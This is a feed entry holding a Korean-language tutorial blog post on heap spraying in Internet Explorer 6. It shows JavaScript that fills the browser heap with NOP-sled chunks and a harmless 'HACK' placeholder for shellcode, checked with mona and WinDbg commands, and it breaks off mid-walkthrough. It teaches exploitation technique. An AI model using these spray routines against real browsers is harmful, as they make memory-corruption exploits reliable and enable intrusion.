<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.7.4">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-06-29T22:58:16+09:00</updated><id>/</id><title type="html">LIN ARENA</title><subtitle>LIN ARENA Technology Blog</subtitle><entry><title type="html">Heap Spray</title><link href="/windows-0x0d" rel="alternate" type="text/html" title="Heap Spray" /><published>2019-06-27T20:18:00+09:00</published><updated>2019-06-27T20:18:00+09:00</updated><id>/windows-0x0d</id><content type="html" xml:base="/windows-0x0d">&lt;h1 id=&quot;0x0c-heap-spray&quot;&gt;0x0c Heap Spray&lt;/h1&gt;

&lt;p&gt;안녕하세요. Joel입니다.&lt;/p&gt;

&lt;p&gt;오늘은 Heap Spray에 대해 알아보도록 하겠습니다.&lt;/p&gt;

&lt;h5 id=&quot;what-is-heap-spray&quot;&gt;What is Heap Spray?&lt;/h5&gt;

&lt;p&gt;Heap Spray는 단어 그대로 Heap 영역에 (Spray로 약을 뿌리듯) 전체적으로 골고루 Payload를 구성하는 것을 말합니다.&lt;/p&gt;

&lt;p&gt;BOF나 UAF 등의 공격을 할 때 각종 메모리 보호기법이 적용되어 있으면, Shell Code가 위치하는 곳의 주소를 정확하게 지정할 수 없겠죠?&lt;/p&gt;

&lt;p&gt;이때 Heap 전체에 내가 원하는 코드를 골고루 위치시켜서 예측 가능한 공간에 Payload를 구성하기 위한 기법이죠.&lt;/p&gt;

&lt;p&gt;그래서 공격 순서는 주로 Heap Spary를 통해 Payload를 구성하고 버그/취약점을 이용해서 공격을 하고 EIP가 내가 구성해놓은 Payload가 있는 곳을 가르키도록 합니다.&lt;/p&gt;

&lt;p&gt;오늘은 Internet Explorer 6을 가지고 기초 개념을 익힌 다음, 최신 버전으로 조금씩 업그레이드 해볼게요.&lt;/p&gt;

&lt;p&gt;(브라우저를 가지고 진행하는 이유는 자바스크립트나 VB스크립트를 이용해서 메모리에 데이터 삽입을 쉽게 할 수 있다는 이점이 있기 때문입니다.
하지만, 브라우저에서만 할 수 있는게 아니라는 점도 같이 기억해둡시다.)&lt;/p&gt;

&lt;h5 id=&quot;기본-원리&quot;&gt;기본 원리&lt;/h5&gt;

&lt;h6 id=&quot;문자열-할당&quot;&gt;문자열 할당&lt;/h6&gt;

&lt;p&gt;브라우저 메모리에 특정 데이터를 할당시키는 가장 기본적인 방법은 자바스크립트를 이용해서 변수를 생성하고 값을 할당하는 것입니다.&lt;/p&gt;

&lt;p&gt;먼저, 아래와 같이 코드를 구성하고 Heap 메모리에 데이터를 할당해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;HACK&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
		
	&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Alloc Done!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 코드를 브라우저에서 실행시킨 다음 Immunity Debugger로 어떻게 할당되는지 살펴보겠습니다.&lt;/p&gt;

&lt;p&gt;Immunity에서 File &amp;gt; Attach &amp;gt; Internet Explorer로 Attach를 한 뒤,&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!mona find -s &quot;HACK&quot; -unicode -x *
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;명령을 사용하면 해당 값을 확인할 수 있습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_2.png&quot; alt=&quot;[그림 1-1]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;위 값을 보면 HACK이라는 값이 들어가 있는 것을 확인할 수 있죠?&lt;/p&gt;

&lt;p&gt;그런데 여기에 우리가 좀 더 살펴봐야할 점들이 있습니다.&lt;/p&gt;

&lt;p&gt;먼저, “HACK”이라는 값은 들어갔는데 48 00 41 00 43 00 4B 00이네? 값 사이에 Null이 있는데 어떻게 Payload를 구성하지?&lt;/p&gt;

&lt;p&gt;이건 해당 값이 유니코드 형식으로 변환되기 때문인데 이를 이해하려면 먼저 BSTR 문자열 객체를 이해해야 합니다.&lt;/p&gt;

&lt;h6 id=&quot;bstr&quot;&gt;BSTR?&lt;/h6&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;BSTR Header&lt;/th&gt;
      &lt;th style=&quot;text-align: center&quot;&gt;문자열 값&lt;/th&gt;
      &lt;th style=&quot;text-align: right&quot;&gt;Null Terminator&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;4 Byte&lt;/td&gt;
      &lt;td style=&quot;text-align: center&quot;&gt;String * 2 Byte&lt;/td&gt;
      &lt;td style=&quot;text-align: right&quot;&gt;2 Byte&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;사실 문자열이 할당되면 이 문자열은 BSTR 문자열 객체로 변환됩니다. 이 객체는 헤더+문자열+종단값 형식으로 구성되어 있습니다.&lt;/p&gt;

&lt;p&gt;문자열이 BSTR 문자열 객체로 변환되게 되면 기존 값이 유니코드 형식의 값으로 변형되어 저장되는 특징이 있습니다.&lt;/p&gt;

&lt;p&gt;그래서 예제에서 넣은 “HACK”이라는 문자열이 “48 00 41 00 43 00 4B 00”로 변환되어 저장되는 것이죠.&lt;/p&gt;

&lt;p&gt;그리고 위에서 헤더와 종단값을 가진다고 했는데 헤더는 변환된 문자열의 길이를 나타내는 4바이트 값입니다.&lt;/p&gt;

&lt;p&gt;종단값은 이 객체의 끝을 나타내기 위해 “00 00” 2바이트 값으로 구성되어 있습니다.&lt;/p&gt;

&lt;p&gt;앞에서 사용한 예제를 BSTR 객체 전체가 보이게 나타낸 그림입니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_3.png&quot; alt=&quot;[그림 1-3]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;HACK 문자열이 “48 00 41 00 43 00 4B 00”로 변환되니까 헤더 값이 08 00 00 00(리틀엔디안)인 것도 보입니다.&lt;/p&gt;

&lt;p&gt;이제 BSTR 구조는 이해가 되시죠?&lt;/p&gt;

&lt;p&gt;아 그럼 유니코드 형식으로 바뀌기 때문에 그렇다는건 이해하겠는데 Null은 어떻게 해결할건가요??&lt;/p&gt;

&lt;h6 id=&quot;null&quot;&gt;Null?&lt;/h6&gt;

&lt;p&gt;다행히도 자바스크립트에 unescape 함수를 사용하면 아주 쉽게 해결이 됩니다.&lt;/p&gt;

&lt;p&gt;unescape 함수는 인코딩된 문자를 디코딩하는 역할을 수행합니다.&lt;/p&gt;

&lt;p&gt;그래서 이 함수에게 문자열을 전달할 때 해당 문자열이 원래 유니코드임을 알려주면 이 함수는 해당 내용을 유니코드로 변환하지 않게 됩니다.&lt;/p&gt;

&lt;p&gt;코드는 다음과 같이 변환했습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&amp;gt;&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;script &lt;/span&gt;&lt;span class=&quot;na&quot;&gt;language=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;javascript&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
		&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%u4148%u4B43'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
		
		&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Alloc Done!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
	&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;이 코드를 실행한 뒤 이번에는 Windbg로 메모리 값을 살펴보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;s -a 0x00000000 L?0x7fffffff &quot;HACK&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_4.png&quot; alt=&quot;[그림 1-4]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;먼저, 헤더부분을 보면 08 00 00 00에서 04 00 00 00으로 변환된 것을 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;그리고 본문을 살펴보면 우리가 걱정했던 NUll이 모두 사라진 것을 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;이제 Null 문제도 해결되었으니 본격적으로 Spray를 해보도록 하겠습니다.&lt;/p&gt;

&lt;h6 id=&quot;spray&quot;&gt;Spray&lt;/h6&gt;

&lt;p&gt;Heap Spray는 Heap 전체에 내가 원하는 코드를 골고루 위치시켜서 예측 가능한 공간에 Payload를 구성하기 위한 기법이라고 했었죠?&lt;/p&gt;

&lt;p&gt;Payload는 다수의 NOP과 Shell Code의 조합으로 한 덩어리를 구성할 겁니다.&lt;/p&gt;

&lt;p&gt;이 덩어리들을 반복적으로 여러개를 할당해서 힙 메모리 전역에 할당해준다면 어떻게 될까요?&lt;/p&gt;

&lt;p&gt;그럼 EIP를 제어할 때 쉘코드를 담고 있는 덩어리가 있는 곳으로 보낼 수 있겠죠.&lt;/p&gt;

&lt;p&gt;위치가 조금 다르다고 해도 NOP으로만 점프하도록 만들 수 있다면, Shell Code가 실행될 수 있을 겁니다.&lt;/p&gt;

&lt;p&gt;Spray 수행을 위해 다음과 같이 코드를 구성했습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;ShellCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%u4148%u4B43'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;num_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;200&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%u9090%u9090'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ShellCode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;testArr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;testArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ShellCode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Spray Done!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;한 덩어리의 크기가 0x1000인 덩어리(NOP+Shellcode) 200개를 메모리에 할당하도록 구성된 코드입니다.&lt;/p&gt;

&lt;p&gt;시작 위치를 살펴보기 쉽게 하기 위해서 ShellCode+NOP 형태로 구성하였습니다.&lt;/p&gt;

&lt;p&gt;코드를 실행한 후 Windbg로 살펴보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_6.png&quot; alt=&quot;[그림 1-6]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;“HACK” + NOP 200개가 출력되는 것이 보이네요.&lt;/p&gt;

&lt;p&gt;이번에는 다음 명령어로 전체 힙의 정보를 살펴보도록 할게요.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!heap -stat
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_7.png&quot; alt=&quot;[그림 1-7]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;출력되는 값들 중 맨 위 기본 힙의 사용량(Committed bytes)이 가장 많은 게 보이네요.&lt;/p&gt;

&lt;p&gt;그럼 우리가 입력한 값들이 힙에 얼마정도가 할당되어 뿌려졌는지 확인해보겠습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!heap -stat -h 0x140000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_8.png&quot; alt=&quot;[그림 1-8]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0x2010 크기로 c1 횟수만큼 무엇인가 할당이 되었고 70.11%를 차지하고 있다는 통계 내용을 확인할 수 있습니다.&lt;/p&gt;

&lt;p&gt;저 값이 내가 할당한 값이 맞는지 확인해봐야겠죠?&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!heap -flt s 0x2010
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 명령어는 heap에 0x2010 크기로 할당된 힙 chunk들을 찾아서 보여줍니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_9.png&quot; alt=&quot;[그림 1-9]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;찾아진 힙 chunk 중 하나의 주소값을 덤프해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_10.png&quot; alt=&quot;[그림 1-10]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0x001cd370(Heap_Entry) 주소를 출력하니 힙 header(8 bytes) + BSTR 객체 header(4 bytes) + “HACK” + NOP이 보입니다.&lt;/p&gt;

&lt;p&gt;그런데 0x2010만큼 떨어진 곳의 값을 확인하니 전혀 다른 값들이 들어있는 것을 확인할 수 있죠?&lt;/p&gt;

&lt;p&gt;즉, 우리가 원하는 값이 연속적으로 할당된 것이 아니라 사이에 빈 공간이 존재한다는 것입니다.&lt;/p&gt;

&lt;p&gt;우리가 이제 해야할 것은 이 빈 공간을 줄여서 Exploit의 신뢰도를 높여야 합니다.&lt;/p&gt;

&lt;p&gt;이를 위해 코드를 다음과 같이 수정했습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;script&amp;gt;&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;Shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%u4148%u4B43'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x40000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;num_chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;500&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;

	&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;unescape&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'%u9090%u9090'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;chunksize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Shellcode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nx&quot;&gt;testArr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;Array&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;){&lt;/span&gt;
 &lt;span class=&quot;nx&quot;&gt;testArr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;Shellcode&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;chunk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;alert&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;Spray Done!&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/script&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;chunk 크기를 0x40000으로 늘리고 chunk의 개수를 500개로 늘렸습니다.&lt;/p&gt;

&lt;p&gt;이를 실행한 후 다시 위 과정을 반복해보면 다음과 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_12.png&quot; alt=&quot;[그림 1-12]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;0x80010 크기로 1f5개가 할당되었고 99.33%만큼 힙에 뿌려진 것을 알 수 있습니다.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!heap -flt s 0x80010
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;위 명령어로 0x80010 크기만큼 할당된 영역을 다시 확인해보면 아래와 같습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_13.png&quot; alt=&quot;[그림 1-13]&quot; /&gt;
&lt;/figure&gt;

&lt;p&gt;이 중 아무 위치나 선택해서 덤프해보겠습니다.&lt;/p&gt;

&lt;figure&gt;
  &lt;img data-action=&quot;zoom&quot; src=&quot;/assets/images/windows/0x0d_14.png&quot; alt=&quot;[그림 1-14]&quot; /&gt;
